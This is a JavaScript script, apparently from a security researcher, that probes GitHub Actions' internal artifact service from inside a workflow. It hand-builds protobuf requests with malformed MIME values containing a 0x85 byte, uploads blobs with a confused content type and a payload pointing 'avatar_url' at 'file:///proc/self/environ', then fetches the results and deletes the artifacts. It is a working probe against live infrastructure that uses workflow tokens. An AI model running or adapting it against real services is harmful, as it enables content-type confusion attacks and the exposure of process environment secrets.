import { BlobClient } from '@azure/storage-blob';
import { internalArtifactTwirpClient } from './node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import { getBackendIdsFromToken } from './node_modules/@actions/artifact/lib/internal/shared/util.js';
import { CreateArtifactResponse, StringValue } from './node_modules/@actions/artifact/lib/generated/index.js';

const client = internalArtifactTwirpClient();
const backend = getBackendIdsFromToken();
const endpoint = new URL('/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', process.env.ACTIONS_RESULTS_URL);
const repo = process.env.GITHUB_REPOSITORY;
const root = `https://api.github.com/repos/${repo}`;
const gh = { Authorization: `Bearer ${process.env.GITHUB_TOKEN}`, Accept: 'application/vnd.github.v3+json', 'User-Agent': 'repo-cassette-protobuf-mime-probe' };
const valid = Buffer.from('application/json');
const nel = Buffer.concat([valid, Buffer.from([0x85])]);
function varint(n) { const a=[]; while (n>=128) { a.push((n&127)|128); n=Math.floor(n/128); } a.push(n); return Buffer.from(a); }
function bytes(no, data) { return Buffer.concat([varint(no*8+2), varint(data.length), data]); }
function str(no, s) { return bytes(no, Buffer.from(s)); }
function num(no, n) { return Buffer.concat([varint(no*8), varint(n)]); }
function wrapper(...values) { return Buffer.concat(values.map(x=>bytes(1,x))); }
const cases = [
  ['valid',7,[wrapper(valid)]],
  ['nel-raw',7,[wrapper(nel)]],
  ['nested-valid-nel',7,[wrapper(valid,nel)]],
  ['nested-nel-valid',7,[wrapper(nel,valid)]],
  ['outer-valid-nel',7,[wrapper(valid),wrapper(nel)]],
  ['outer-nel-valid',7,[wrapper(nel),wrapper(valid)]],
  ['v6-nel',6,[wrapper(nel)]],
];
for (const [label,version,wrappers] of cases) {
  const name = `protobuf-${process.env.GITHUB_RUN_ID}-${label}`;
  const body = Buffer.concat([
    str(1,backend.workflowRunBackendId), str(2,backend.workflowJobRunBackendId),
    str(3,name), num(5,version), ...wrappers.map(x=>bytes(6,x))
  ]);
  let id;
  try {
    const response = await fetch(endpoint,{method:'POST',headers:{Authorization:`Bearer ${process.env.ACTIONS_RUNTIME_TOKEN}`,'Content-Type':'application/protobuf'},body,signal:AbortSignal.timeout(10000)});
    const raw = Buffer.from(await response.arrayBuffer());
    let reply;
    try { reply = response.headers.get('content-type')?.includes('protobuf') ? CreateArtifactResponse.fromBinary(raw) : JSON.parse(raw.toString()); } catch {}
    if (!response.ok || !reply?.signedUploadUrl) {
      const error = response.headers.get('content-type')?.includes('json') ? raw.toString().slice(0,180) : raw.toString('hex').slice(0,80);
      console.log('PROTO_REJECT',JSON.stringify({label,status:response.status,ct:response.headers.get('content-type'),error}));
      continue;
    }
    const payload = Buffer.from(JSON.stringify({label,full_name:repo,owner:{avatar_url:'file:///proc/self/environ'}}));
    await new BlobClient(reply.signedUploadUrl).getBlockBlobClient().uploadData(payload,{blobHTTPHeaders:{blobContentType:'\u0085application/json'}});
    const sealed = await client.FinalizeArtifact({...backend,name,size:String(payload.length)});
    id = String(sealed.artifactId);
    const r = await fetch(`${root}/actions/artifacts/${id}/zip`,{headers:gh,redirect:'manual'});
    const location = r.headers.get('location');
    const final = location ? await fetch(location) : null;
    const ct = final?.headers.get('content-type');
    const observed = final ? await final.arrayBuffer() : null;
    console.log('PROTO_ACCEPT',JSON.stringify({label,id,redirect:r.status,status:final?.status,ct,size:observed?.byteLength,candidate:ct?.includes('\u0085')}));
  } catch(error) { console.log('PROTO_ERROR',JSON.stringify({label,error:String(error).slice(0,180)})); }
  finally { if(id){const d=await fetch(`${root}/actions/artifacts/${id}`,{method:'DELETE',headers:gh});console.log('CLEANUP',JSON.stringify({id,status:d.status}));} }
}
